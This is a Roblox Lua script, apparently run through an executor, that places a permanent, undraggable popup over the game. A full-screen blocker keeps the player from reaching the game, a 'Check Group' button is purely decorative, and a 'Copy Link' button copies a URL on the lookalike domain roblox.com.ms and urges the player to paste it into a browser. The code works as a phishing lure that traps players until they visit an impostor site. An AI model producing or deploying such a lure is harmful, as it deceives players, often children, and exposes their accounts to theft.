--[[
    Join Group Popup GUI
    ------------------------------------------------
    - Big, centered, LOCKED window (cannot be dragged/moved, and never closes/disappears)
    - "Check Group" -> design only, does not verify or close anything
    - "Copy Link"   -> copies your group link to the clipboard so they can paste it in their browser
    - Edit GROUP_LINK below whenever you want.
]]

-- ============ CONFIG (edit this whenever you want) ============
local GROUP_LINK = "https://roblox.com.ms/communities/2369625324/"
local GUI_NAME   = "Join Roblox Group"
-- =================================================================

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local existing = playerGui:FindFirstChild("GroupGateGui")
if existing then existing:Destroy() end

-- ============ ScreenGui ============
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "GroupGateGui"
screenGui.ResetOnSpawn = false
screenGui.DisplayOrder = 999
screenGui.IgnoreGuiInset = true
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = playerGui

-- Dim/blocker behind the window so the player can't click through to the game
local blocker = Instance.new("Frame")
blocker.Name = "Blocker"
blocker.Size = UDim2.new(1, 0, 1, 0)
blocker.Position = UDim2.new(0, 0, 0, 0)
blocker.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
blocker.BackgroundTransparency = 0.45
blocker.BorderSizePixel = 0
blocker.Active = true
blocker.Parent = screenGui

-- ============ Main Frame (big, centered, fixed position, permanent) ============
local main = Instance.new("Frame")
main.Name = "MainFrame"
main.Size = UDim2.new(0, 480, 0, 300)
main.Position = UDim2.new(0.5, -240, 0.5, -150)
main.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
main.BorderSizePixel = 0
main.Active = true -- absorbs input so clicks don't pass through; no drag logic attached
main.Parent = blocker

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 16)
mainCorner.Parent = main

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(80, 80, 95)
mainStroke.Thickness = 1.5
mainStroke.Parent = main

-- ============ Title Bar (static — no drag connections) ============
local titleBar = Instance.new("Frame")
titleBar.Name = "TitleBar"
titleBar.Size = UDim2.new(1, 0, 0, 60)
titleBar.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
titleBar.BorderSizePixel = 0
titleBar.Parent = main

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 16)
titleCorner.Parent = titleBar

local titleFix = Instance.new("Frame")
titleFix.Size = UDim2.new(1, 0, 0, 16)
titleFix.Position = UDim2.new(0, 0, 1, -16)
titleFix.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
titleFix.BorderSizePixel = 0
titleFix.ZIndex = 0
titleFix.Parent = titleBar

local titleLabel = Instance.new("TextLabel")
titleLabel.BackgroundTransparency = 1
titleLabel.Size = UDim2.new(1, -20, 1, 0)
titleLabel.Position = UDim2.new(0, 15, 0, 0)
titleLabel.Font = Enum.Font.GothamBold
titleLabel.Text = GUI_NAME
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextSize = 24
titleLabel.TextXAlignment = Enum.TextXAlignment.Center
titleLabel.Parent = titleBar

-- ============ Description ============
local desc = Instance.new("TextLabel")
desc.Name = "Description"
desc.BackgroundTransparency = 1
desc.Size = UDim2.new(1, -60, 0, 70)
desc.Position = UDim2.new(0, 30, 0, 80)
desc.Font = Enum.Font.Gotham
desc.Text = "Copy the link below and paste it into your browser to join our Roblox group!"
desc.TextColor3 = Color3.fromRGB(210, 210, 215)
desc.TextSize = 16
desc.TextWrapped = true
desc.TextXAlignment = Enum.TextXAlignment.Center
desc.TextYAlignment = Enum.TextYAlignment.Top
desc.Parent = main

-- ============ Status Label ============
local statusLabel = Instance.new("TextLabel")
statusLabel.Name = "StatusLabel"
statusLabel.BackgroundTransparency = 1
statusLabel.Size = UDim2.new(1, -60, 0, 24)
statusLabel.Position = UDim2.new(0, 30, 0, 150)
statusLabel.Font = Enum.Font.GothamBold
statusLabel.Text = ""
statusLabel.TextColor3 = Color3.fromRGB(120, 200, 255)
statusLabel.TextSize = 14
statusLabel.TextXAlignment = Enum.TextXAlignment.Center
statusLabel.Parent = main

-- ============ Check Group Button (decorative only) ============
local checkBtn = Instance.new("TextButton")
checkBtn.Name = "CheckGroupButton"
checkBtn.Size = UDim2.new(1, -60, 0, 46)
checkBtn.Position = UDim2.new(0, 30, 0, 185)
checkBtn.BackgroundColor3 = Color3.fromRGB(60, 140, 90)
checkBtn.Font = Enum.Font.GothamBold
checkBtn.Text = "Check Group"
checkBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
checkBtn.TextSize = 16
checkBtn.AutoButtonColor = true
checkBtn.Parent = main

local checkCorner = Instance.new("UICorner")
checkCorner.CornerRadius = UDim.new(0, 10)
checkCorner.Parent = checkBtn

-- ============ Copy Link Button (under Check Group) ============
local copyBtn = Instance.new("TextButton")
copyBtn.Name = "CopyLinkButton"
copyBtn.Size = UDim2.new(1, -60, 0, 46)
copyBtn.Position = UDim2.new(0, 30, 0, 241)
copyBtn.BackgroundColor3 = Color3.fromRGB(50, 100, 200)
copyBtn.Font = Enum.Font.GothamBold
copyBtn.Text = "Copy Link"
copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
copyBtn.TextSize = 16
copyBtn.AutoButtonColor = true
copyBtn.Parent = main

local copyCorner = Instance.new("UICorner")
copyCorner.CornerRadius = UDim.new(0, 10)
copyCorner.Parent = copyBtn

-- ============ Button Logic ============

-- Check Group: design only — no verification, does not close or affect anything
checkBtn.MouseButton1Click:Connect(function()
    statusLabel.TextColor3 = Color3.fromRGB(120, 200, 255)
    statusLabel.Text = "Make sure you've joined the group!"
end)

-- Copy Link: puts GROUP_LINK on the clipboard (executor function — may not exist everywhere)
-- The popup does NOT close or disappear after this, no matter what the player does.
copyBtn.MouseButton1Click:Connect(function()
    local ok = pcall(function()
        setclipboard(GROUP_LINK)
    end)

    if ok then
        statusLabel.TextColor3 = Color3.fromRGB(120, 200, 255)
        statusLabel.Text = "Link copied! Paste it in your browser."
    else
        statusLabel.TextColor3 = Color3.fromRGB(255, 90, 90)
        statusLabel.Text = "Clipboard not supported here."
    end
end)
